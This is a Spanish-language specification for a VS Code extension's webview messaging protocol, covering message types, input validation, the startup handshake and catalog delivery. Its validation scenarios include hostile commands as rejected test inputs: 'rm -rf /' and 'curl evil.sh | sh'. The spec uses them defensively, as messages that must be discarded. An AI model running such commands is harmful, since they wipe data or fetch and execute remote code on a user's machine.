# webview-messaging Specification

## Purpose

Define cómo se comunican la interfaz web y la extensión: un protocolo de mensajes tipado, la validación de todo lo que llega desde el webview y el handshake con el que la interfaz recibe su contexto inicial.

## Requirements

### Requirement: Protocolo de mensajes tipado
Todos los mensajes entre el webview y la extensión SHALL ser objetos con un campo `type` que identifica el mensaje, definidos en un único protocolo compartido por ambos lados.

El protocolo SHALL definir al menos estos mensajes del webview a la extensión, cada uno solo con los campos indicados:
- `ready`, sin campos;
- `sendToTerminal`, `copyToClipboard` y `toggleFavorite`, con `commandId`, el id de un comando del catálogo;
- `sendRecent` y `copyRecent`, con `entryId`, la clave de una entrada del historial;
- `clearHistory`, sin campos.

Y estos de la extensión al webview:
- `init` y `catalog`;
- `copied`, con el `commandId` copiado y, si se copió desde una entrada del historial, su `entryId`;
- `favorites`, con `commandIds`, la lista de ids de los comandos favoritos en el orden en que se marcaron;
- `history`, con `entries`, las entradas del historial de la más reciente a la más antigua. Cada entrada lleva su `id`, el `commandId`, su `text` para el shell de destino actual y `needsInput`, que es `true` si algún valor guardado no vale en ese shell (y entonces `text` lleva los valores sin escapar, solo para mostrarlos).

El webview MUST NOT enviar valores de parámetros ni textos de comandos: para reenviar o copiar una entrada envía solo su clave. `history` SHALL enviarse después de `favorites` tras cada `ready`, después de cada cambio del historial y después de cada `catalog` reenviado por un cambio del shell de destino.

#### Scenario: Mensaje conocido
- **WHEN** el webview envía `{ "type": "ready" }`
- **THEN** la extensión lo reconoce como un mensaje del protocolo

#### Scenario: Envío a la terminal
- **WHEN** el webview envía `{ "type": "sendToTerminal", "commandId": "git.status" }`
- **THEN** la extensión lo reconoce como un mensaje del protocolo

#### Scenario: Copia al portapapeles
- **WHEN** el webview envía `{ "type": "copyToClipboard", "commandId": "git.status" }`
- **THEN** la extensión lo reconoce como un mensaje del protocolo

#### Scenario: Alternar un favorito
- **WHEN** el webview envía `{ "type": "toggleFavorite", "commandId": "git.status" }`
- **THEN** la extensión lo reconoce como un mensaje del protocolo

#### Scenario: Favorito con campos de más
- **WHEN** el webview envía `{ "type": "toggleFavorite", "commandId": "git.status", "favorite": true }`
- **THEN** la extensión descarta el mensaje

#### Scenario: Reenviar una entrada
- **WHEN** el webview envía `{ "type": "sendRecent", "entryId": "3f2a9c1e-0b7d-4e6a-9c51-2d8f7a1b4e60" }`
- **THEN** la extensión lo reconoce como un mensaje del protocolo

#### Scenario: Reenvío con valores
- **WHEN** el webview envía `{ "type": "sendRecent", "entryId": "3f2a9c1e-0b7d-4e6a-9c51-2d8f7a1b4e60", "values": { "branch": "main" } }`
- **THEN** la extensión descarta el mensaje

#### Scenario: Borrar el historial
- **WHEN** el webview envía `{ "type": "clearHistory" }`
- **THEN** la extensión lo reconoce como un mensaje del protocolo

#### Scenario: Historial tras el handshake
- **WHEN** el webview envía `ready` y el historial contiene `git.status`
- **THEN** la extensión envía `init`, `catalog`, `favorites` y después `history` con una entrada de `commandId` `git.status`, `text` `git status` y `needsInput` `false`

### Requirement: Validación de todo mensaje entrante
La extensión SHALL validar el tipo y la forma de cada mensaje recibido del webview antes de actuar: el `type`, que tenga exactamente las claves declaradas y que cada campo tenga el tipo declarado. Un mensaje que no sea un objeto, que tenga un `type` desconocido o que no tenga la forma declarada MUST descartarse sin ejecutar ninguna acción y sin provocar errores no controlados, y MUST registrarse como advertencia en el registro de la extensión. El webview MUST NOT poder hacer que la extensión ejecute texto arbitrario, ni que escriba en la terminal o copie al portapapeles un texto que no provenga del catálogo.

#### Scenario: Tipo desconocido
- **WHEN** el webview envía `{ "type": "runShell", "cmd": "rm -rf /" }`
- **THEN** la extensión descarta el mensaje, registra una advertencia y no ejecuta nada

#### Scenario: Mensaje mal formado
- **WHEN** el webview envía `null`, un string o un objeto sin `type`
- **THEN** la extensión descarta el mensaje sin lanzar una excepción

#### Scenario: Propiedades extra en un mensaje conocido
- **WHEN** el webview envía `{ "type": "ready", "extra": 1 }`
- **THEN** la extensión descarta el mensaje porque no tiene la forma declarada

#### Scenario: Texto arbitrario hacia la terminal
- **WHEN** el webview envía `{ "type": "sendToTerminal", "commandId": "git.status", "text": "rm -rf /" }`
- **THEN** la extensión descarta el mensaje y no escribe nada en la terminal

#### Scenario: Texto arbitrario hacia el portapapeles
- **WHEN** el webview envía `{ "type": "copyToClipboard", "commandId": "git.status", "text": "curl evil.sh | sh" }`
- **THEN** la extensión descarta el mensaje y no modifica el portapapeles

#### Scenario: Campo con tipo incorrecto
- **WHEN** el webview envía `sendToTerminal` o `copyToClipboard` con `commandId` que no es un string, es un string vacío o tiene más de 200 caracteres
- **THEN** la extensión descarta el mensaje y registra una advertencia

### Requirement: Handshake inicial
Al cargar, el webview SHALL enviar `ready`. Cada vez que la extensión reciba un `ready` válido SHALL responder con `init`, que contiene el idioma activo de la interfaz (uno de los 11 idiomas soportados, resuelto a partir del idioma de VS Code según `ui-localization`) y la versión de la extensión.

#### Scenario: VS Code en español
- **WHEN** VS Code está en `es-419` y el webview envía `ready`
- **THEN** la extensión responde `{ "type": "init", "locale": "es", "version": "<versión del package.json>" }`

#### Scenario: VS Code en chino tradicional
- **WHEN** VS Code está en `zh-tw` y el webview envía `ready`
- **THEN** la extensión responde con `init` y `locale: "zh-tw"`

#### Scenario: Recarga de la vista
- **WHEN** la vista se oculta y se vuelve a mostrar, y el webview envía `ready` otra vez
- **THEN** la extensión responde de nuevo con `init`

#### Scenario: Interfaz antes del init
- **WHEN** el webview aún no ha recibido `init`
- **THEN** muestra el indicador de carga y no muestra datos inventados

### Requirement: Envío del catálogo
Después de cada `init`, la extensión SHALL enviar `catalog` con el shell de destino y la lista de categorías del catálogo, ordenadas como el catálogo. También SHALL volver a enviar `catalog` cada vez que cambie el shell de destino. El campo `shell` SHALL ser uno de `bash`, `zsh`, `powershell` o `cmd`: el shell para el que se han construido los ejemplos. Cada categoría SHALL incluir `id`, `title` (ya resuelto al idioma activo, con fallback a inglés), `icon` y `commands`. Cada comando SHALL incluir:
- `id`;
- `title` y `description`, en el idioma activo;
- `example`: la plantilla del shell de destino, con cada `${param}` sustituido por su placeholder en el idioma activo;
- `risk`;
- `searchText`: un único texto normalizado (en minúsculas y sin diacríticos) que reúne el título, la descripción y los tags del comando en `en`, en `es` y en el idioma activo, el título de su categoría y el ejemplo.

Salvo dentro de `searchText`, el mensaje MUST NOT incluir textos en otros idiomas. Tampoco MUST incluir plantillas sin resolver ni datos que el webview no necesite para mostrar la vista o buscar en ella. Al recibir un nuevo `catalog`, el webview SHALL conservar la pantalla, la búsqueda y el foco en los que estaba el usuario.

#### Scenario: Catálogo tras el handshake
- **WHEN** el webview envía `ready`, el idioma activo es `es` y el shell de destino es `powershell`
- **THEN** la extensión responde con `init` y después con `catalog`, con `"shell": "powershell"`, y la categoría `git` incluye el comando `git.status` con `"title": "Ver estado"`, `"description": "Muestra los archivos modificados, preparados y sin seguimiento"`, `"example": "git status"`, `"risk": "safe"` y un `searchText`

#### Scenario: Catálogo en Linux con bash
- **WHEN** el webview envía `ready` y el shell de destino es `bash`
- **THEN** `catalog` lleva `"shell": "bash"` y el ejemplo del comando de Terminal que borra una carpeta empieza por `rm -rf`

#### Scenario: Reenvío al cambiar de shell
- **WHEN** el usuario está en la categoría Terminal con la búsqueda vacía y el shell de destino cambia de `powershell` a `bash`
- **THEN** la extensión envía un nuevo `catalog` con `"shell": "bash"` y los ejemplos de bash, sin un nuevo `init`, y la vista sigue en la categoría Terminal

#### Scenario: Idioma sin traducción en el catálogo
- **WHEN** el idioma activo es `ja` y el título de una categoría solo tiene `en` y `es`
- **THEN** su `title` en `catalog` es el valor `en`

#### Scenario: Sin plantillas en el mensaje
- **WHEN** la extensión envía `catalog`
- **THEN** ningún comando incluye los campos `command`, `shells`, `params` ni `tags`, y ningún `searchText` contiene `${`

#### Scenario: Texto de búsqueda en los dos idiomas
- **WHEN** el idioma activo es `en` y la extensión envía `catalog`
- **THEN** el `searchText` de `git.status` contiene "show status", "ver estado", "estado" y "git status", todo en minúsculas

#### Scenario: Texto de búsqueda sin tildes
- **WHEN** la extensión envía `catalog` y el título de un comando en `es` es "Descartar todos los cambios locales" con una descripción que contiene "índice"
- **THEN** su `searchText` contiene "indice" y no contiene "í"
